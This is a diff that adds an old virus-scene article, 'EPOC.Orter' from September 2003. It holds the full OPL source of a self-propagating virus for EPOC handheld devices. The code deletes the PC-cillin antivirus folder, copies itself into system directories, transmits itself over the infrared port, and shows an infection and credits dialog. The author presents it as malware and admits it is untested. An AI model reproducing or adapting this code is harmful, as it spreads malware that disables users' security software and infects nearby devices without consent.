@@ -1,0 +1,78 @@
+					   
+					  _             
+                     |_)  _ _|_  ._  _ 
+                     | \ (/_ |_  |  (_)              www.pugnax.co.uk
+					*************************************************
+					**                 EPOC.Orter                  **
+					**              September 2003                 **
+					*************************************************
+						          Anarchistic Sadistic
+
+
+                    From what I know of this is the first virus developed for epoc systems. 
+                    This code may be buggy as I haven’t tested it because I only have one 
+                    epoc device and it spreads through Infrared. When run, it deletes the 
+                    PC-cillin anti-virus contents and folder, copies itself to 
+                    C:\System\orter and then tries to send itself through the infrared port.
+
+                    -----[C O D E]---------------------------------------------------------
+
+                    /*   EPOC.Orter by Retro
+                         http:retro.host.sk
+                         www.indovirus.net   */
+                     
+                    APP Orter,666
+                    ENDA
+                     
+                    PROC Main:
+	                    GLOBAL file$(255), statusW&amp;
+	                    file$ = "Orter.app"
+	                    gVISIBLE OFF
+                     
+	                    IF EXIST ("C:\System\Orter\")
+	                       dINIT "Epoc.Orter"
+                               dTEXT "","You have been infected"
+                               dBUTTONS "OK", %O | $100
+	                       RETURN DIALOG = %Y
+	                    ELSE
+	                       Retro:
+	                       Infect:
+	                       SendI:
+	                       Payload:
+	                    ENDIF
+                    ENDP
+                     
+                    PROC Payload:
+	                    dINIT "Epoc.Orter by Retro"
+	                    dTEXT "","http://retro.host.sk" ,$202
+	                    dTEXT "","Shouts go out to indovirus.net, Iwing",2
+	                    dTEXT "","Kefi, cpu_wizad and magstr2003",$202
+	                    dBUTTONS "OK", %O | $100
+	                    RETURN DIALOG=%O
+                    ENDP
+                     
+                    PROC Retro:
+	                    IF EXIST ("C:\System\Apps\PcciEpoc\")
+	                       DELETE "C:\System\Apps\PcciEpoc\*"
+	                       RMDIR "C:\System\Apps\PcciEpoc\"
+	                    ELSE
+	                    ENDIF
+                    ENDP
+                     
+                    PROC Infect:
+	                    ONERR NEXT::
+	                    MKDIR "C:\System\Orter\"
+	                    COPY "Orter.app","C:\System\Orter\"
+	                    COPY "Orter.app","C:\System\Temp\"
+	                    NEXT::
+                    ENDP
+                     
+                    PROC SendI:
+	                    IRDACONNECTTOSEND&amp;:(KItTinyTP$,8)
+	                    IRDAWRITE:(file$, statusW&amp;)
+	                    IF statusW&amp; = 0
+	                       IRDADISSCONECT:
+	                    ELSE
+	                       STOP
+	                    ENDIF
+                    ENDP
